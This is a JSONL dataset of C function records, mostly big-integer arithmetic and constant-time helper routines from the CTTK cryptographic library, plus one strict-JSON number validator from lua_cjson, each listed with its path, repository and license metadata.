{"docstring": "/*\n * Generic encoding routine.\n */\n", "func_signal": "static void\ngenenc(void *dst, size_t dst_len, const uint32_t *x, int be)", "code": "{\n\tunsigned char *buf;\n\tuint32_t h, acc, ssx;\n\tunsigned mask, acc_len;\n\tsize_t u, len, v;\n\n\th = x[0];\n\tmask = (h >> 31) - 1;\n\th &= 0x7FFFFFFF;\n\tlen = (h + 31) >> 5;\n\n\tssx = -(uint32_t)((x[len] >> top_index(h)) & 1) >> 1;\n\tacc = x[1];\n\tacc_len = 31;\n\tu = 1;\n\tbuf = dst;\n\tfor (v = 0; v < dst_len; v ++) {\n\t\tunsigned b;\n\n\t\tif (acc_len >= 8) {\n\t\t\tb = acc & 0xFF;\n\t\t\tacc >>= 8;\n\t\t\tacc_len -= 8;\n\t\t} else {\n\t\t\tb = acc;\n\t\t\tif (u < len) {\n\t\t\t\tacc = x[1 + u];\n\t\t\t\tu ++;\n\t\t\t} else {\n\t\t\t\tacc = ssx;\n\t\t\t}\n\t\t\tb |= acc << acc_len;\n\t\t\tacc >>= (8 - acc_len);\n\t\t\tacc_len += 23;\n\t\t}\n\t\tb &= mask;\n\t\tif (be) {\n\t\t\tbuf[dst_len - 1 - v] = b;\n\t\t} else {\n\t\t\tbuf[v] = b;\n\t\t}\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "uint64_t\ncttk_i31_to_u64_trunc(const uint32_t *x)", "code": "{\n\tuint32_t h;\n\tuint64_t r;\n\n\th = x[0] & 0x7FFFFFFF;\n\tr = x[1];\n\tif (h > 64) {\n\t\tr |= (uint64_t)x[2] << 31 | (uint64_t)x[3] << 62;\n\t} else if (h > 32) {\n\t\tr |= (uint64_t)x[2] << 31;\n\t\tr |= -(r & ((uint64_t)1 << 61));\n\t} else {\n\t\tr |= -(r & ((uint64_t)1 << 30));\n\t}\n\treturn r & ((uint64_t)(x[0] >> 31) - 1);\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_xor(uint32_t *d, const uint32_t *a, const uint32_t *b)", "code": "{\n\tuint32_t h;\n\tsize_t len, u;\n\n\th = d[0] & 0x7FFFFFFF;\n\tif (h != (a[0] & 0x7FFFFFFF) || h != (b[0] & 0x7FFFFFFF)) {\n\t\td[0] |= 0x80000000;\n\t\treturn;\n\t}\n\tlen = (h + 31) >> 5;\n\td[0] = a[0] | b[0];\n\tfor (u = 1; u <= len; u ++) {\n\t\td[u] = a[u] ^ b[u];\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_lsh(uint32_t *d, const uint32_t *a, uint32_t n)", "code": "{\n\tcttk_bool r;\n\n\tif (((d[0] ^ a[0]) << 1) != 0) {\n\t\td[0] |= 0x80000000;\n\t\treturn;\n\t}\n\tr = genlsh(d, a, n / 31, n % 31, cttk_true);\n\td[0] |= (r.v ^ 1) << 31;\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_swap(uint32_t *a, uint32_t *b)", "code": "{\n\tsize_t u, len;\n\n\tif (a == b) {\n\t\treturn;\n\t}\n\tif ((uint32_t)((a[0] ^ b[0]) << 1) != 0) {\n\t\ta[0] |= 0x80000000;\n\t\tb[0] |= 0x80000000;\n\t\treturn;\n\t}\n\tlen = ((a[0] & 0x7FFFFFFF) + 63) >> 5;\n\tfor (u = 0; u < len; u ++) {\n\t\tuint32_t w;\n\n\t\tw = a[u];\n\t\ta[u] = b[u];\n\t\tb[u] = w;\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Internal division routine:\n *\n *   - r is non-NULL.\n *   - q, r, t1 and t2 are distinct from each other. Only q may be NULL.\n *   - t1 and t2 are distinct from a and b.\n *   - All non-NULL arrays have the same size.\n *\n * Note that q and r may be aliases on a or b.\n */\n", "func_signal": "static void\ngendiv_inner(uint32_t *q, uint32_t *r, const uint32_t *a,\n\tconst uint32_t *b, uint32_t *t1, uint32_t *t2, int mod)", "code": "{\n\tuint32_t h, n, hk, sa, sb;\n\tsize_t ud, len, u;\n\tunsigned um;\n\tcttk_bool a_isnan, a_isminv, b_isnan, b_isminv, b_iszero, b_ismone;\n\tcttk_bool both_nan, half_nan;\n\n\th = b[0] & 0x7FFFFFFF;\n\thk = top_index(h);\n\tn = h - (h >> 5);\n\tud = h >> 5;\n\tum = h & 31;\n\tlen = (h + 31) >> 5;\n\n\t/*\n\t * We use absolute values, and then adjust signs.\n\t * Special cases are the following:\n\t *\n\t *   - If a is NaN and/or b is NaN, then q and r are set to NaN.\n\t *   - If b is zero, then q and r are set to NaN.\n\t *   - If a and/or b is MinValue, then the corresponding absolute\n\t *     value cannot be computed. Instead, we have to perform the\n\t *     following adjustments:\n\t *\n\t *       If a == MinValue and b < 0, subtract b from a, and add 1\n\t *       to q before adjusting its sign.\n\t *\n\t *       If a == MinValue and b > 0, add b to a, and add 1 to q\n\t *       before adjusting its sign.\n\t *\n\t *       If b == MinValue and a == MinValue, then set q to 1 and\n\t *       r to 0.\n\t *\n\t *       If b == MinValue and a != MinValue, then set q to 0 and\n\t *       r to a.\n\t *\n\t *     The two first rules may be merged into the following:\n\t *\n\t *       If a == MinValue, add |b| to a, and add 1 to q before\n\t *       adjusting its sign.\n\t */\n\n\t/*\n\t * If a or b is NaN, or b is zero, then both q and r will be NaN.\n\t * If a is MinValue and b is -1, then q = NaN and r = 0.\n\t * We obtain the relevant values here:\n\t *    a_isnan      a is NaN\n\t *    b_isnan      b is NaN\n\t *    a_isminv     a == MinValue\n\t *    b_isminv     b == MinValue\n\t *    b_iszero     b == 0\n\t *    b_ismone     b == -1\n\t */\n\ta_isnan = cttk_i31_isnan(a);\n\tb_isnan = cttk_i31_isnan(b);\n\ta_isminv = cttk_true;\n\tb_isminv = cttk_true;\n\tb_iszero = cttk_true;\n\tb_ismone = cttk_true;\n\tfor (u = 0; (u + 1) < len; u ++) {\n\t\ta_isminv = cttk_and(a_isminv, cttk_u32_eq0(a[1 + u]));\n\t\tb_isminv = cttk_and(b_isminv, cttk_u32_eq0(b[1 + u]));\n\t\tb_iszero = cttk_and(b_iszero, cttk_u32_eq0(b[1 + u]));\n\t\tb_ismone = cttk_and(b_iszero,\n\t\t\tcttk_u32_eq(b[1 + u], 0x7FFFFFFF));\n\t}\n\ta_isminv = cttk_and(a_isminv,\n\t\tcttk_u32_eq(a[len], ((uint32_t)-1 << hk) & 0x7FFFFFFF));\n\tb_isminv = cttk_and(b_isminv,\n\t\tcttk_u32_eq(b[len], ((uint32_t)-1 << hk) & 0x7FFFFFFF));\n\tb_iszero = cttk_and(b_iszero, cttk_u32_eq0(b[len]));\n\tb_ismone = cttk_and(b_ismone, cttk_u32_eq(b[len], 0x7FFFFFFF));\n\n\t/*\n\t * Get signs.\n\t */\n\tsa = a[len] >> 30;\n\tsb = b[len] >> 30;\n\n\t/*\n\t * Compute |b| into t2.\n\t */\n\tcttk_i31_neg(t2, b);\n\tcttk_i31_cond_copy(cttk_u32_eq0(sb), t2, b);\n\n\t/*\n\t * Set r to |a| or |a+|b||. t1 is free at that point. r may be\n\t * aliased on a or b, but not on t1.\n\t */\n\tcttk_i31_add(t1, a, t2);\n\tcttk_i31_cond_copy(cttk_not(a_isminv), t1, a);\n\tcttk_i31_neg(r, t1);\n\tcttk_i31_cond_copy(cttk_not(cttk_bool_of_u32(t1[len] >> 30)), r, t1);\n\n\t/*\n\t * Now r is set, and |b|. We \"forget\" about the true b, and instead\n\t * use |b|.\n\t */\n\tb = t2;\n\n\t/*\n\t * Set q to 0 (if defined).\n\t */\n\tif (q != NULL) {\n\t\tq[0] &= 0x7FFFFFFF;\n\t\tmemset(q + 1, 0, ((h + 31) >> 5) * sizeof *q);\n\t}\n\n\t/*\n\t * Compute the division on the positive values.\n\t */\n\twhile (n -- > 0) {\n\t\tcttk_bool e;\n\n\t\t/*\n\t\t * The shift on b may yield a NaN, but in that case, the\n\t\t * comparison will be false, and the cond_copy will put\n\t\t * back the non-NaN value of r.\n\t\t */\n\t\tcttk_i31_lsh(t1, b, n);\n\t\te = cttk_i31_leq(t1, r);\n\t\tcttk_i31_sub(t1, r, t1);\n\t\tcttk_i31_cond_copy(e, r, t1);\n\t\tif (q != NULL) {\n\t\t\tif (um == 0) {\n\t\t\t\tum = 30;\n\t\t\t\tud --;\n\t\t\t} else {\n\t\t\t\tum --;\n\t\t\t}\n\t\t\tq[1 + ud] |= e.v << um;\n\t\t}\n\t}\n\n\t/*\n\t * Adjust values and signs. t1 is free.\n\t */\n\tif (q != NULL) {\n\t\tint32_t p;\n\n\t\t/*\n\t\t * If b == MinValue, then we must set q to 0; if\n\t\t * a == MinValue too, we will add 1 afterwards.\n\t\t */\n\t\tcttk_i31_set_u32_trunc(t1, 0);\n\t\tcttk_i31_cond_copy(b_isminv, q, t1);\n\n\t\t/*\n\t\t * We adjust the sign of q: it is negative if the\n\t\t * signs of a and b differ.\n\t\t */\n\t\tcttk_i31_neg(t1, q);\n\t\tcttk_i31_cond_copy(cttk_bool_of_u32(sa ^ sb), q, t1);\n\n\t\t/*\n\t\t * If a == MinValue, then there is a +1 or -1 to add.\n\t\t * Normally we would do the +1 before adjusting the\n\t\t * sign of q, but there is an edge case where the +1\n\t\t * would set the value to MaxValue+1 (i.e. NaN),\n\t\t * whereas setting the sign first, then subtracting 1,\n\t\t * yields MinValue (which is correct and not NaN).\n\t\t */\n\t\tp = cttk_bool_to_int(a_isminv);\n\t\tcttk_i31_set_s32(t1,\n\t\t\tcttk_s32_mux(cttk_bool_of_u32(sa ^ sb), -p, p));\n\t\tcttk_i31_add(q, q, t1);\n\t}\n\tcttk_i31_neg(t1, r);\n\tcttk_i31_cond_copy(cttk_bool_of_u32(sa), r, t1);\n\n\t/*\n\t * Handle the special cases for b == MinValue. In that case,\n\t * when we computed |b|, we got a NaN, and all checks in the\n\t * loop were false. Thus, if a != MinValue, r contains a copy\n\t * of a at this point (which is correct) and we just have to\n\t * set the quotient to 0.\n\t */\n\tcttk_i31_set_u32_trunc(t1, 0);\n\tif (q != NULL) {\n\t\tcttk_i31_cond_copy(\n\t\t\tcttk_and(b_isminv, cttk_not(a_isminv)), q, t1);\n\t}\n\tcttk_i31_cond_copy(cttk_and(b_isminv, a_isminv), r, t1);\n\tif (q != NULL) {\n\t\tcttk_i31_set_u32(t1, 1);\n\t\tcttk_i31_cond_copy(cttk_and(b_isminv, a_isminv), q, t1);\n\t}\n\n\t/*\n\t * Apply NaN conditions.\n\t */\n\tboth_nan = cttk_or(cttk_or(a_isnan, b_isnan), b_iszero);\n\thalf_nan = cttk_and(a_isminv, b_ismone);\n\tif (q != NULL) {\n\t\tq[0] |= cttk_or(both_nan, half_nan).v << 31;\n\t}\n\tr[0] |= both_nan.v << 31;\n\tcttk_i31_set_u32_trunc(t1, 0);\n\tcttk_i31_cond_copy(half_nan, r, t1);\n\n\t/*\n\t * Extra step if doing modular reduction:\n\t *  - If r >= 0, it is already fine.\n\t *  - If r < 0 and b < 0, then we must subtract b.\n\t *  - If r < 0 and b > 0, then we must add b.\n\t *\n\t * Since |r| < |b|, then we have the following properties:\n\t *  - If the generic division hit a NaN, then the result must\n\t *    be a NaN as well.\n\t *  - If r and b are both non-NaN, then the extra operation\n\t *    cannot overflow or underflow.\n\t *\n\t * We may not have b anymore at that point, though (since r\n\t * might be aliased to b). We have |b| in t2 (and we set the 'b'\n\t * pointer to t2). We can add |b| conditionally to r being\n\t * negative. However, |b| might be a NaN if b == MinValue; we\n\t * must isolate that case.\n\t */\n\tif (mod) {\n\t\tuint32_t sr;\n\n\t\tsr = r[len] >> 30;\n\t\tcttk_i31_add(t1, r, b);\n\t\tcttk_i31_cond_copy(cttk_and(cttk_bool_of_u32(sr),\n\t\t\tcttk_not(b_isminv)), r, t1);\n\n\t\t/*\n\t\t * When b == MinValue, we want to subtract MinValue from\n\t\t * r, which is equivalent to flipping the sign bit.\n\t\t */\n\t\tr[len] ^= ((-(sr & b_isminv.v) << hk) & 0x7FFFFFFF);\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "cttk_bool\ncttk_i31_geq(const uint32_t *x, const uint32_t *y)", "code": "{\n\tif ((uint32_t)((x[0] ^ y[0]) << 1) != 0) {\n\t\treturn cttk_false;\n\t}\n\treturn cttk_not(cttk_or(val_lt(x, y), tst_nan2(x, y)));\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_divrem(uint32_t *q, uint32_t *r, const uint32_t *a, const uint32_t *b)", "code": "{\n\tuint32_t h;\n\n\th = a[0] & 0x7FFFFFFF;\n\tif (h != (b[0] & 0x7FFFFFFF)) {\n\t\tif (q != NULL) {\n\t\t\tq[0] |= 0x80000000;\n\t\t}\n\t\tif (r != NULL) {\n\t\t\tr[0] |= 0x80000000;\n\t\t}\n\t\treturn;\n\t}\n\tif (q != NULL && h != (q[0] & 0x7FFFFFFF)) {\n\t\tq[0] |= 0x80000000;\n\t\tq = NULL;\n\t}\n\tif (r != NULL && h != (r[0] & 0x7FFFFFFF)) {\n\t\tr[0] |= 0x80000000;\n\t\tr = NULL;\n\t}\n\tif (q == NULL && r == NULL) {\n\t\treturn;\n\t}\n\tif (q == r) {\n\t\tq[0] |= 0x80000000;\n\t\tr[0] |= 0x80000000;\n\t\treturn;\n\t}\n\n\tgendiv(q, r, a, b, 0);\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Sign-extend an n-bit value to 32 bits (1 <= n <= 32).\n */\n", "func_signal": "static inline uint32_t\nsignext(uint32_t v, unsigned n)", "code": "{\n\tuint32_t hi, lo;\n\n\thi = -(uint32_t)((v >> (n - 1)) & 1) << (n - 1);\n\tlo = v & ((uint32_t)-1 >> (32 - n));\n\treturn hi | lo;\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_sub_trunc(uint32_t *d, const uint32_t *a, const uint32_t *b)", "code": "{\n\tuint32_t h, cc;\n\tsize_t len, u;\n\n\t/*\n\t * Compare sizes. This needs not be constant-time, but take\n\t * care to mask out the NaN bit (since that one may be secret).\n\t */\n\th = d[0] & 0x7FFFFFFF;\n\tif (h != (a[0] & 0x7FFFFFFF) || h != (b[0] & 0x7FFFFFFF)) {\n\t\td[0] |= 0x80000000;\n\t\treturn;\n\t}\n\tlen = (h + 31) >> 5;\n\n\t/*\n\t * Since sizes are equal, we can simply OR together the header\n\t * words, which will propagate any NaN.\n\t */\n\td[0] = a[0] | b[0];\n\n\t/*\n\t * Compute subtraction.\n\t */\n\tcc = 0;\n\tfor (u = 0; u < len; u ++) {\n\t\tuint32_t wa, wb, wd;\n\n\t\twa = a[u + 1];\n\t\twb = b[u + 1];\n\t\twd = wa - wb - cc;\n\t\td[u + 1] = wd & 0x7FFFFFFF;\n\t\tcc = wd >> 31;\n\t}\n\n\t/*\n\t * Apply truncation to the proper size.\n\t */\n\td[len] = signext(d[len], top_index(h) + 1) & 0x7FFFFFFF;\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_cond_swap(cttk_bool ctl, void *a, void *b, size_t len)", "code": "{\n\t/*\n\t * TODO: make optimised versions for special cases:\n\t *\n\t *  - We can copy by full words, depending on alignment (and\n\t *    architecture tolerance for unaligned accesses), even in\n\t *    case of overlap (it suffices to do the copy in the\n\t *    appropriate direction).\n\t *\n\t *  - We may use SSE2, AVX2, or similar vector operands on\n\t *    platforms that support them.\n\t *\n\t * Code below is the basic, portable variant.\n\t */\n\tunsigned char *za, *zb;\n\tsize_t u;\n\n\tza = a;\n\tzb = b;\n\n\tfor (u = 0; u < len; u ++) {\n\t\tuint32_t x;\n\n\t\tx = (za[u] ^ zb[u]) & -ctl.v;\n\t\tza[u] ^= x;\n\t\tzb[u] ^= x;\n\t}\n}", "path": "src\\oram1.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "int32_t\ncttk_i31_to_s32(const uint32_t *x)", "code": "{\n\tuint32_t r;\n\n\tr = cttk_i31_to_u32_trunc(x);\n\tr &= -cttk_u32_lt(real_bitlength(x), 32).v;\n\treturn *(int32_t *)&r;\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Generic right-shift function:\n *\n *  - d and a must have been already verified to have the same size.\n *  - Shift count is n = nd*31+nm, with 0 <= nm < 31, and n fits on 32 bits.\n *  - If ctl is false, then the shift is not actually done.\n *\n * nd and nm may leak.\n */\n", "func_signal": "static void\ngenrsh(uint32_t *d, const uint32_t *a, uint32_t nd, unsigned nm, cttk_bool ctl)", "code": "{\n\tuint32_t h, ssa, n, bl;\n\tsize_t u, len;\n\n\td[0] = a[0];\n\th = d[0] & 0x7FFFFFFF;\n\tlen = (h + 31) >> 5;\n\tbl = h - (h >> 5);\n\tn = 31 * nd + nm;\n\tssa = -(a[len] >> 30) & 0x7FFFFFFF;\n\n\t/*\n\t * If right-shifting by at least bl-1 bits, then the result is\n\t * either 0 or -1, depending on source sign.\n\t */\n\tif ((n + 1) >= bl) {\n\t\tfor (u = 0; u < len; u ++) {\n\t\t\td[1 + u] = cttk_u32_mux(ctl, ssa, a[1 + u]);\n\t\t}\n\t\treturn;\n\t}\n\n\t/*\n\t * We have:\n\t *    len * 31 >= bl\n\t *    n >= 31 * nd\n\t * We reach that point only if n < bl, which implies nd < len.\n\t */\n\n\tif (nm == 0) {\n\t\tfor (u = 0; u < (len - nd); u ++) {\n\t\t\td[1 + u] = cttk_u32_mux(ctl, a[1 + u + nd], a[1 + u]);\n\t\t}\n\t} else {\n\t\tfor (u = 0; u < (len - nd - 1); u ++) {\n\t\t\tuint32_t wa;\n\n\t\t\twa = ((a[1 + u + nd] >> nm)\n\t\t\t\t| (a[2 + u + nd] << (31 - nm))) & 0x7FFFFFFF;\n\t\t\td[1 + u] = cttk_u32_mux(ctl, wa, a[1 + u]);\n\t\t}\n\t\td[len - nd] = cttk_u32_mux(ctl,\n\t\t\t((a[len] >> nm) | (ssa << (31 - nm))) & 0x7FFFFFFF,\n\t\t\ta[len - nd]);\n\t}\n\tfor (u = len - nd; u < len; u ++) {\n\t\td[1 + u] = cttk_u32_mux(ctl, ssa, a[1 + u]);\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Compare x with zero. This function ignores the NaN flag.\n */\n", "func_signal": "static cttk_bool\nval_eq0(const uint32_t *x)", "code": "{\n\tuint32_t h, r;\n\tsize_t len, u;\n\n\th = x[0] & 0x7FFFFFFF;\n\tlen = (h + 31) >> 5;\n\tr = 0;\n\tfor (u = 0; u < len; u ++) {\n\t\tr |= x[u + 1];\n\t}\n\treturn cttk_u32_eq0(r);\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_array_read(void *d,\n\tconst void *a, size_t elt_len, size_t num_len, size_t index)", "code": "{\n\tsize_t u;\n\tconst unsigned char *b;\n\n\tmemset(d, 0, elt_len);\n\tfor (u = 0, b = a; u < num_len; u ++, b += elt_len) {\n\t\tcttk_cond_copy(cttk_u64_eq(u, index), d, b, elt_len);\n\t}\n}", "path": "src\\oram1.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "int32_t\ncttk_i31_to_s32_trunc(const uint32_t *x)", "code": "{\n\tuint32_t r;\n\n\tr = cttk_i31_to_u32_trunc(x);\n\treturn *(int32_t *)&r;\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_copy(uint32_t *d, const uint32_t *s)", "code": "{\n\tif (d != s) {\n\t\tif ((uint32_t)((d[0] ^ s[0]) << 1) != 0) {\n\t\t\td[0] |= 0x80000000;\n\t\t\treturn;\n\t\t}\n\t\tmemcpy(d, s, (((s[0] & 0x7FFFFFFF) + 63) >> 5) * sizeof *s);\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Compare integers; this function assumes that both operands have the\n * same size. The common length (in words) is provided. The header word\n * of each value is ignored.\n */\n", "func_signal": "static cttk_bool\nval_lt(const uint32_t *x, const uint32_t *y)", "code": "{\n\tsize_t u, len;\n\tuint32_t cc;\n\n\tlen = ((x[0] & 0x7FFFFFFF) + 31) >> 5;\n\tcc = 0;\n\tfor (u = 0; u < len; u ++) {\n\t\tuint32_t wx, wy, wz;\n\n\t\twx = x[u + 1];\n\t\twy = y[u + 1];\n\t\twz = wx - wy - cc;\n\t\tcc = (wz >> 31);\n\t}\n\n\t/*\n\t * Mathematical sign of the result (r), depending on the operand\n\t * signs and carry value:\n\t *\n\t *   x   y  cc   r\n\t *\n\t *   0   0   0   0\n\t *   0   0   1   1\n\t *   0   1   0   not possible\n\t *   0   1   1   0\n\t *   1   0   0   1\n\t *   1   0   1   not possible\n\t *   1   1   0   0\n\t *   1   1   1   1\n\t *\n\t * Thus, the XOR of the sign bits of x and y, and of the carry,\n\t * yields the sign of the result.\n\t */\n\tcc ^= (x[len] ^ y[len]) >> 30;\n\treturn cttk_bool_of_u32(cc);\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/*\n * Generic decoding routine.\n */\n", "func_signal": "static void\ngendec(uint32_t *x, const void *src, size_t src_len, int be, int sig, int trunc)", "code": "{\n\tuint32_t h, top, top2;\n\tconst unsigned char *buf;\n\tsize_t u, v, len;\n\tunsigned ssb, ssx, k, hk, extra_bits, extra_bits_len;\n\tcttk_bool in_range;\n\n\tx[0] &= 0x7FFFFFFF;\n\th = x[0];\n\tlen = (h + 31) >> 5;\n\tmemset(x + 1, 0, len * sizeof *x);\n\tif (src_len == 0) {\n\t\tif (sig) {\n\t\t\tx[0] |= 0x80000000;\n\t\t}\n\t\treturn;\n\t}\n\tbuf = src;\n\thk = top_index(h);\n\n\t/*\n\t * 'ssb' is the value used for bytes beyond the source buffer.\n\t */\n\tif (sig) {\n\t\tif (be) {\n\t\t\tssb = -(unsigned)(buf[0] >> 7) & 0xFF;\n\t\t} else {\n\t\t\tssb = -(unsigned)(buf[src_len - 1] >> 7) & 0xFF;\n\t\t}\n\t} else {\n\t\tssb = 0;\n\t}\n\n\t/*\n\t * u:k points to the next bits to fill in x (u is word index, k\n\t * is bit index).\n\t * v is source byte index (counting from 0 for least significant).\n\t */\n\tu = 0;\n\tk = 0;\n\tv = 0;\n\n\t/*\n\t * in_range is set to false if the value turns out to be out of\n\t * range (this is ignored if truncating). ssx is set to 0x00 or\n\t * 0xFF when the sign bit of x is reached.\n\t */\n\tin_range = cttk_true;\n\tssx = 0;\n\n\t/*\n\t * extra_bits / extra_bits_len will be set if there are extra bits\n\t * that must be checked against the final value sign.\n\t */\n\textra_bits = 0;\n\textra_bits_len = 0;\n\n\twhile (u < len || v < src_len) {\n\t\tunsigned b;\n\n\t\t/*\n\t\t * Get next byte of input in b.\n\t\t */\n\t\tif (v < src_len) {\n\t\t\tb = be ? buf[src_len - 1 - v] : buf[v];\n\t\t} else {\n\t\t\tb = ssb;\n\t\t}\n\t\tv ++;\n\n\t\tif (u < len) {\n\t\t\tif (k <= 23) {\n\t\t\t\tx[1 + u] |= (uint32_t)b << k;\n\t\t\t} else {\n\t\t\t\t/*\n\t\t\t\t * If we get beyond the last word boundary\n\t\t\t\t * then we may have some extra bits which\n\t\t\t\t * will have to be checked against the\n\t\t\t\t * value sign.\n\t\t\t\t */\n\t\t\t\tx[1 + u] |= ((uint32_t)b << k) & 0x7FFFFFFF;\n\t\t\t\tif ((u + 1) < len) {\n\t\t\t\t\tx[2 + u] |= (uint32_t)b >> (31 - k);\n\t\t\t\t} else {\n\t\t\t\t\textra_bits = (uint32_t)b >> (31 - k);\n\t\t\t\t\textra_bits_len = k - 23;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tk += 8;\n\t\t\tif (k >= 31) {\n\t\t\t\tk -= 31;\n\t\t\t\tu ++;\n\t\t\t\tif (u == len) {\n\t\t\t\t\tssx = -(unsigned)((x[len] >> hk) & 1)\n\t\t\t\t\t\t& 0xFF;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\t/*\n\t\t\t * If all words are filled, then we merely check\n\t\t\t * that extra bytes have a value compatible with\n\t\t\t * the range.\n\t\t\t */\n\t\t\tin_range = cttk_and(in_range, cttk_u32_eq(b, ssx));\n\t\t}\n\t}\n\n\t/*\n\t * We reach this point only when we filled all value words, and\n\t * read all source bytes. ssx has been set. We still need to do\n\t * some cleanup actions:\n\t *\n\t *  - If truncating, then there may be some extra bits in the top\n\t *    word that must be replaced with a sign extension.\n\t *\n\t *  - If not truncating, then we must check that the extra bits\n\t *    in the top word, and also the \"extra bits\" (if applicable),\n\t *    have the proper value. Moreover, if source is unsigned, then\n\t *    we must also check that we got a positive value.\n\t */\n\ttop = x[len];\n\ttop2 = signext(top, hk + 1) & 0x7FFFFFFF;\n\tif (trunc) {\n\t\tx[len] = top2;\n\t} else {\n\t\tin_range = cttk_and(in_range, cttk_u32_eq(top, top2));\n\t\tif (extra_bits_len > 0) {\n\t\t\tin_range = cttk_and(in_range, cttk_u32_eq(extra_bits,\n\t\t\t\tssx >> (8 - extra_bits_len)));\n\t\t}\n\t\tif (!sig) {\n\t\t\tin_range = cttk_and(in_range, cttk_u32_eq0(ssx));\n\t\t}\n\t\tx[0] |= cttk_not(in_range).v << 31;\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* see cttk.h */\n", "func_signal": "void\ncttk_i31_set_s32(uint32_t *x, int32_t v)", "code": "{\n\tuint32_t h, size;\n\tsize_t u, len;\n\tuint32_t w;\n\n\tx[0] &= 0x7FFFFFFF;\n\th = x[0];\n\tlen = (h + 31) >> 5;\n\tsize = h - (h >> 5);\n\tw = (uint32_t)v;\n\tx[1] = w & 0x7FFFFFFF;\n\n\t/*\n\t * If size is at least 32 bits, then there can be no overflow,\n\t * but we must extend the sign bit over all remaining words.\n\t * If size is 31 bits or less, then we check that all top bits\n\t * of the source value are equal to each other.\n\t */\n\tif (size >= 32) {\n\t\tw = -(w >> 31) >> 1;\n\t\tfor (u = 1; u < len; u ++) {\n\t\t\tx[u + 1] = w;\n\t\t}\n\t} else {\n\t\tuint32_t m;\n\n\t\tm = (uint32_t)-1 << (size - 1);\n\t\tw &= m;\n\t\tx[0] |= (cttk_u32_neq0(w).v & cttk_u32_neq0(w ^ m).v) << 31;\n\t}\n}", "path": "src\\int31.c", "repo_name": "pornin/CTTK", "stars": 286, "license": "mit", "language": "c", "size": 123}
{"docstring": "/* JSON numbers should take the following form:\n *      -?(0|[1-9]|[1-9][0-9]+)(.[0-9]+)?([eE][-+]?[0-9]+)?\n *\n * json_next_number_token() uses strtod() which allows other forms:\n * - numbers starting with '+'\n * - NaN, -NaN, infinity, -infinity\n * - hexidecimal numbers\n * - numbers with leading zeros\n *\n * json_is_invalid_number() detects \"numbers\" which may pass strtod()'s\n * error checking, but should not be allowed with strict JSON.\n *\n * json_is_invalid_number() may pass numbers which cause strtod()\n * to generate an error.\n */\n", "func_signal": "static int json_is_invalid_number(json_parse_t *json)", "code": "{\n    int i = json->index;\n\n    /* Reject numbers starting with + */\n    if (json->data[i] == '+')\n        return 1;\n\n    /* Skip minus sign if it exists */\n    if (json->data[i] == '-')\n        i++;\n\n    /* Reject numbers starting with 0x, or leading zeros */\n    if (json->data[i] == '0') {\n        int ch2 = json->data[i + 1];\n\n        if ((ch2 | 0x20) == 'x' ||          /* Hex */\n            ('0' <= ch2 && ch2 <= '9'))     /* Leading zero */\n            return 1;\n\n        return 0;\n    } else if (json->data[i] <= '9') {\n        return 0;                           /* Ordinary number */\n    }\n\n\n    /* Reject inf/nan */\n    if (!strncasecmp(&json->data[i], \"inf\", 3))\n        return 1;\n    if (!strncasecmp(&json->data[i], \"nan\", 3))\n        return 1;\n\n    /* Pass all other numbers which may still be invalid, but\n     * strtod() will catch them. */\n    return 0;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
